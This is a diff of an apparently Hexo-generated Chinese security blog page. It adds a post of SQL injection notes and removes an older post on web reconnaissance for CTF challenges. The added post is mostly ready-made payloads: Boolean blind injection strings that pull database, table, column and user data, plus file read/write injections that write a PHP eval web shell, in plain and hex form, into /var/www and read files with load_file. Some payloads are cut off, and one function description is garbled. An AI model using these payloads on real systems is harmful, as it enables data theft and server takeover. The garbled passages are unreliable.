@@ -64,6 +64,76 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQL1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/06/SQL1/" class="article-date">
+  <time datetime="2022-02-06T10:06:29.958Z" itemprop="datePublished">2022-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL基础知识"><a href="#SQL基础知识" class="headerlink" title="SQL基础知识"></a>SQL基础知识</h1><h4 id="五、Boolean-盲注"><a href="#五、Boolean-盲注" class="headerlink" title="五、Boolean 盲注"></a>五、Boolean 盲注</h4><h5 id="5-1含义"><a href="#5-1含义" class="headerlink" title="5.1含义:"></a>5.1含义:</h5><p>有些情况下，开发人员屏蔽了报错信息，导致攻击者无法通过报错信息进行注入的判断。这<br>种情况下的注入，称为盲注。 盲注根据展现方式，分为boolean型盲注和时间型盲注。<br>Boolean是基于真假的判断（true or false）; 不管输入什么，结果都只返回真或假两种情况； 通过and 1=1和and 1=2可以发现注入点。<br>Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果 判断正确与否。</p>
+<h5 id="5-2Boolean型盲注的判断方式"><a href="#5-2Boolean型盲注的判断方式" class="headerlink" title="5.2Boolean型盲注的判断方式"></a>5.2Boolean型盲注的判断方式</h5><p>通过长度判断length():length(database())&gt;=x<br>通过字符判断substr():substr(database(),1,1) =‘s’<br>通过ascII码判断:ascii():ascii(substr(database(),1,1)) =x</p>
+<h5 id="5-3Boolean注入攻击"><a href="#5-3Boolean注入攻击" class="headerlink" title="5.3Boolean注入攻击"></a>5.3Boolean注入攻击</h5><p>Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的，以此来获取数据库中的数据。<br>A:判断数据库名的长度</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.16.10/web/sql/boolean.php?id=1&#39;">http://172.16.16.10/web/sql/boolean.php?id=1&#39;</a> and length(database())&gt;=1–+<br>B:判断数据库名</p>
+<p>‘and substr(database(),1,1)–+<br>C:Burp判断数据库名</p>
+<p>id=1’ and substr(database(),1,1)=’a’–+<br>D:Burpsuite爆破数据库的表名</p>
+<p>id=1’ and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’a’–+<br>E:Burp爆字段名</p>
+<p>id=1’ and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’a’–+<br>F:获取数据</p>
+<p>id=1’ and substr((select username from test.users limit 0,1),1,1)=’a’–+</p>
+<h4 id="六、五大报错注入"><a href="#六、五大报错注入" class="headerlink" title="六、五大报错注入"></a>六、五大报错注入</h4><p>利用条件：页面回显 SQL语句执行的错误信息，例如 mysql_error() </p>
+<p>updatexml() 函数： </p>
+<p>这个函数的第二个参数本应该是合法的 XPATH 路径，否则就会在引发报错的同时将传入的参数 </p>
+<p>进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个 </p>
+<p>参数即可查询。 </p>
+<p>六种函数：GeometryCollection() </p>
+<ul>
+<li>如果任何自变量为<code>NULL</code>或任何几何自变量为空几何，则返回值为<code>NULL</code>。</li>
+<li>如果任何几何参数都不是语法上格式正确的几何，<code>ER_GIS_INVALID_DATA</code>则会发生错误。</li>
+<li>如果任何几何参数的SRID值都引用未定义的空间参考系统（SRS），<code>ER_SRS_NOT_FOUND</code>则会发生错误。</li>
+<li>否则，返回值为non-<code>NULL</code>。</li>
+</ul>
+<p>polygon() </p>
+<p>函数功能：该函数画一个由直线相闻的两个以上顶点组成的多边形，用当前画笔画多边形轮廓，用当前画刷和多边形填充模式填充多边形</p>
+<p>multipoint()</p>
+<p>multilinestring()</p>
+<p>linestring()</p>
+<ul>
+<li>如果任何自变量为<code>NULL</code>或任何几何自变量为空几何，则返回值为<code>NULL</code>。</li>
+<li>如果任何几何参数都不是语法上格式正确的几何，<code>ER_GIS_INVALID_DATA</code>则会发生错误。</li>
+<li>如果任何几何参数的SRID值都引用未定义的空间参考系统（SRS），<code>ER_SRS_NOT_FOUND</code>则会发生错误。</li>
+<li>否则，返回值为non-<code>NULL</code></li>
+</ul>
+<p>multipolygon()</p>
+<h3 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h3><p>7.1 手动 </p>
+<p>写文件1 ?id=-1’ union select 1,”<?php @eval(\$_POST[1]); ?>“,3 into outfile “/var/ww </p>
+<h1 id="可将文件内容转换成十六进制"><a href="#可将文件内容转换成十六进制" class="headerlink" title="可将文件内容转换成十六进制"></a>可将文件内容转换成十六进制</h1><p>?id=-1’ union select ,0x3c3f70687020406576616c28245f504f53545b315d293b203f3 </p>
+<p>有回显时 读取文件 </p>
+<p> ?id=-1’ union select 1,2,load_file(‘/var/www/html/1.php’)–+ </p>
+<p> 文件路径 可使用 十六进制</p>
+<p> ?id=-1’ union select ,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870) </p>
+<p>无回显 盲注读取文件 </p>
+<p>?id=-1’ and ascii(mid((select hex(load_file(‘/var/www/html/1.php’))),a,1))&gt;b </p>
+<p> 同时爆破 数字 a 和 ascii 值 b </p>
+<p>7.2 脚本 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/02/06/SQL1/" data-id="ckzb7a35r0000mov35uy8ghyw" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-SQL" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/01/28/SQL/" class="article-date">
@@ -1261,126 +1331,6 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
 
 
   
-    <article id="post-web1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/01/18/web1/" class="article-date">
-  <time datetime="2022-01-18T10:48:41.586Z" itemprop="datePublished">2022-01-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h3 id="1-6搜索引擎"><a href="#1-6搜索引擎" class="headerlink" title="1.6搜索引擎"></a>1.6搜索引擎</h3><ul>
-<li><p>Google 搜索引擎：可以搜索 数据库⽂件、SQL注⼊、配置信息、源代码泄露、未授权访问、robots.txt等敏感信息 </p>
-</li>
-<li><p>Shodan </p>
-</li>
-<li><p>Fofa </p>
-</li>
-<li><p>Zoomeye </p>
-</li>
-</ul>
-<h3 id="1-7-⼦域名信息收集"><a href="#1-7-⼦域名信息收集" class="headerlink" title="1.7 ⼦域名信息收集"></a>1.7 ⼦域名信息收集</h3><ul>
-<li>⼦域名检测⼯具： </li>
-</ul>
-<p>Layer ⼦域名挖掘机 </p>
-<p>subDomainsBrute 可爆破出三级四级甚⾄五级等不易被探测到的域名 </p>
-<p>#实例：python subDomainsBrute.py csdn.net</p>
-<p>Sublist3r </p>
-<p>wydomain <a target="_blank" rel="noopener" href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a>  </p>
-<ul>
-<li>在线⽹址： </li>
-</ul>
-<p>⼦域名爆破⽹站 <a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> </p>
-<p>IP反查绑定域名⽹站 </p>
-<p><a target="_blank" rel="noopener" href="https://dns.aizhan.com/">https://dns.aizhan.com/</a> </p>
-<p><a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com</a> </p>
-<p><a target="_blank" rel="noopener" href="http://dns.aizhan.com/">http://dns.aizhan.com/</a> </p>
-<p><a target="_blank" rel="noopener" href="https://hackertarget.com/fifind-dns-host-records/">https://hackertarget.com/fifind-dns-host-records/</a> </p>
-<p><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
-<p><a target="_blank" rel="noopener" href="http://www.virustotal.com/">www.virustotal.com</a> </p>
-<ul>
-<li><p>证书透明度（CT）公开⽇志枚举</p>
-<h3 id="1-8-收集端⼝信息"><a href="#1-8-收集端⼝信息" class="headerlink" title="1.8 收集端⼝信息"></a>1.8 收集端⼝信息</h3><ul>
-<li>扫描⼯具： </li>
-</ul>
-<p> Nmap </p>
-<p>Masscan </p>
-<p>ZMap </p>
-<p>御剑TCP端⼝扫描  </p>
-</li>
-</ul>
-<h3 id="1-9-探针信息-flag-也可能存在的地方"><a href="#1-9-探针信息-flag-也可能存在的地方" class="headerlink" title="1.9 探针信息 (flag 也可能存在的地方)"></a>1.9 探针信息 (flag 也可能存在的地方)</h3><p>PHP 探针</p>
-<p>含义：php探针 是⽤来探测空间、服务器运⾏状况和PHP信息⽤的，探针可以实时查看 服务器硬盘资源、内存占⽤、⽹卡流量、系统负载、服务器时间等信息。</p>
-<p>常用的有四款php探针：<em>phpinfo</em>，<em>雅黑探针</em>，<em>UPUPW PHP探针</em>，<em>自建探针工具</em></p>
-<p>题例： Web 16 </p>
-<h3 id="1-10-Banner-识别"><a href="#1-10-Banner-识别" class="headerlink" title="1.10 Banner 识别"></a>1.10 Banner 识别</h3><p>Banner信息含义：即是该⽹站服务器对外现实的⼀些基础信息。 </p>
-<p>搜集指纹库 </p>
-<ul>
-<li>GitHub 公开的 CMS 指纹库 </li>
-</ul>
-<p>⼯具使⽤ </p>
-<ul>
-<li>Wappalyzer </li>
-</ul>
-<p>技巧： </p>
-<p>在⽹站上随意输⼊⼀些 URL，有时会通过 404 ⻚⾯或者是 302 跳转⻚⾯ 发现⼀些有⽤信息。 </p>
-<ul>
-<li><p>例如：开启了 Debug 选项的 ThinklPHP ⽹站会在⼀些错误提示⻚⾯显示 ThinkPHP 版本。 </p>
-<h2 id="CTFSHOW总结："><a href="#CTFSHOW总结：" class="headerlink" title="CTFSHOW总结："></a>CTFSHOW总结：</h2><ul>
-<li>第⼀步：查看 源代码 </li>
-</ul>
-<p>右键查看源代码 </p>
-<p> F12 打开开发者⼯具 </p>
-<p> Ctrl + U 查看源代码 </p>
-<p>Burp 抓包查看 </p>
-<ul>
-<li><p>抓包 可能发现⼀些有⽤信息 </p>
-</li>
-<li><p>robots.txt </p>
-</li>
-<li><p>phps 源代码泄露 </p>
-</li>
-<li><p>下载源码⽂件、⽹站备份⽂件 </p>
-</li>
-<li><p>版本控制不要部署到⽣产环境中 .git .svn</p>
-</li>
-<li><p>Vim 缓存 .文件名.php.swp .文件名.php.swo .文件名.php.swn</p>
-</li>
-<li><p>cookie 的重要性 </p>
-</li>
-<li><p>域名、⼦域名 信息搜集 nslookup 在线网站</p>
-</li>
-<li><p>Banner 等公开信息 管理员密码 QQ QQ邮箱等 第三方软件查个人信息</p>
-</li>
-<li><p>技术⽂档 </p>
-</li>
-<li><p>对应编辑器漏洞 探针 </p>
-</li>
-<li><p>前端源码 密钥泄露 </p>
-</li>
-<li><p>db.mdb </p>
-</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/18/web1/" data-id="ckyk0wved0000wkv33g1r3zon" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1404,7 +1354,7 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
     </div>
   </div>
 
@@ -1415,6 +1365,10 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2022/02/06/SQL1/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2022/01/28/SQL/">(no title)</a>
@@ -1430,10 +1384,6 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
         
           <li>
             <a href="/2022/01/24/web6/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/23/web5/">(no title)</a>
           </li>
         
       </ul>
